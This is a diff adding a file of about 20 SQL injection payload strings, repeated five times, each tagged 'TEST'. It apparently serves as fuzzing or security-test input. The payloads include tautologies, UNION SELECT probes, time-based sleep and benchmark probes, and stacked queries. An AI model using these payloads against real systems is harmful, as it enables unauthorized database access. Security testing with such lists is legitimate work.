@@ -1,0 +1,100 @@
+' OR '1'='1' -- TEST
+' OR 'TEST'='TEST' --
+' OR 1=1 --TEST
+' OR 'a'='a' /*TEST*/
+' OR 'TEST'--
+' OR 1=1 LIMIT 1 --TEST
+' OR 1=1#TEST
+' OR 1=1/*TEST*/
+' OR sleep(1)#TEST
+' OR benchmark(1000000,md5('TEST'))--
+' AND 1=0 UNION SELECT 'TEST'--
+' AND 'TEST'='TEST'--
+'; IF 1=1 THEN SELECT 'TEST'; END IF; --
+' AND NOT EXISTS(SELECT * FROM users WHERE name='TEST')--
+' AND (SELECT 'TEST' FROM dual) IS NOT NULL --
+' OR EXISTS(SELECT 'x' FROM users WHERE username='TEST')--
+' AND (SELECT COUNT(*) FROM users WHERE username='TEST') > 0--
+' UNION ALL SELECT NULL,'TEST'--
+'; EXECUTE 'SELECT ''TEST'''; --
+' AND CAST('TEST' AS VARCHAR)=CAST('TEST' AS VARCHAR)--
+' OR '1'='1' -- TEST
+' OR 'TEST'='TEST' --
+' OR 1=1 --TEST
+' OR 'a'='a' /*TEST*/
+' OR 'TEST'--
+' OR 1=1 LIMIT 1 --TEST
+' OR 1=1#TEST
+' OR 1=1/*TEST*/
+' OR sleep(1)#TEST
+' OR benchmark(1000000,md5('TEST'))--
+' AND 1=0 UNION SELECT 'TEST'--
+' AND 'TEST'='TEST'--
+'; IF 1=1 THEN SELECT 'TEST'; END IF; --
+' AND NOT EXISTS(SELECT * FROM users WHERE name='TEST')--
+' AND (SELECT 'TEST' FROM dual) IS NOT NULL --
+' OR EXISTS(SELECT 'x' FROM users WHERE username='TEST')--
+' AND (SELECT COUNT(*) FROM users WHERE username='TEST') > 0--
+' UNION ALL SELECT NULL,'TEST'--
+'; EXECUTE 'SELECT ''TEST'''; --
+' AND CAST('TEST' AS VARCHAR)=CAST('TEST' AS VARCHAR)--
+' OR '1'='1' -- TEST
+' OR 'TEST'='TEST' --
+' OR 1=1 --TEST
+' OR 'a'='a' /*TEST*/
+' OR 'TEST'--
+' OR 1=1 LIMIT 1 --TEST
+' OR 1=1#TEST
+' OR 1=1/*TEST*/
+' OR sleep(1)#TEST
+' OR benchmark(1000000,md5('TEST'))--
+' AND 1=0 UNION SELECT 'TEST'--
+' AND 'TEST'='TEST'--
+'; IF 1=1 THEN SELECT 'TEST'; END IF; --
+' AND NOT EXISTS(SELECT * FROM users WHERE name='TEST')--
+' AND (SELECT 'TEST' FROM dual) IS NOT NULL --
+' OR EXISTS(SELECT 'x' FROM users WHERE username='TEST')--
+' AND (SELECT COUNT(*) FROM users WHERE username='TEST') > 0--
+' UNION ALL SELECT NULL,'TEST'--
+'; EXECUTE 'SELECT ''TEST'''; --
+' AND CAST('TEST' AS VARCHAR)=CAST('TEST' AS VARCHAR)--
+' OR '1'='1' -- TEST
+' OR 'TEST'='TEST' --
+' OR 1=1 --TEST
+' OR 'a'='a' /*TEST*/
+' OR 'TEST'--
+' OR 1=1 LIMIT 1 --TEST
+' OR 1=1#TEST
+' OR 1=1/*TEST*/
+' OR sleep(1)#TEST
+' OR benchmark(1000000,md5('TEST'))--
+' AND 1=0 UNION SELECT 'TEST'--
+' AND 'TEST'='TEST'--
+'; IF 1=1 THEN SELECT 'TEST'; END IF; --
+' AND NOT EXISTS(SELECT * FROM users WHERE name='TEST')--
+' AND (SELECT 'TEST' FROM dual) IS NOT NULL --
+' OR EXISTS(SELECT 'x' FROM users WHERE username='TEST')--
+' AND (SELECT COUNT(*) FROM users WHERE username='TEST') > 0--
+' UNION ALL SELECT NULL,'TEST'--
+'; EXECUTE 'SELECT ''TEST'''; --
+' AND CAST('TEST' AS VARCHAR)=CAST('TEST' AS VARCHAR)--
+' OR '1'='1' -- TEST
+' OR 'TEST'='TEST' --
+' OR 1=1 --TEST
+' OR 'a'='a' /*TEST*/
+' OR 'TEST'--
+' OR 1=1 LIMIT 1 --TEST
+' OR 1=1#TEST
+' OR 1=1/*TEST*/
+' OR sleep(1)#TEST
+' OR benchmark(1000000,md5('TEST'))--
+' AND 1=0 UNION SELECT 'TEST'--
+' AND 'TEST'='TEST'--
+'; IF 1=1 THEN SELECT 'TEST'; END IF; --
+' AND NOT EXISTS(SELECT * FROM users WHERE name='TEST')--
+' AND (SELECT 'TEST' FROM dual) IS NOT NULL --
+' OR EXISTS(SELECT 'x' FROM users WHERE username='TEST')--
+' AND (SELECT COUNT(*) FROM users WHERE username='TEST') > 0--
+' UNION ALL SELECT NULL,'TEST'--
+'; EXECUTE 'SELECT ''TEST'''; --
+' AND CAST('TEST' AS VARCHAR)=CAST('TEST' AS VARCHAR)--
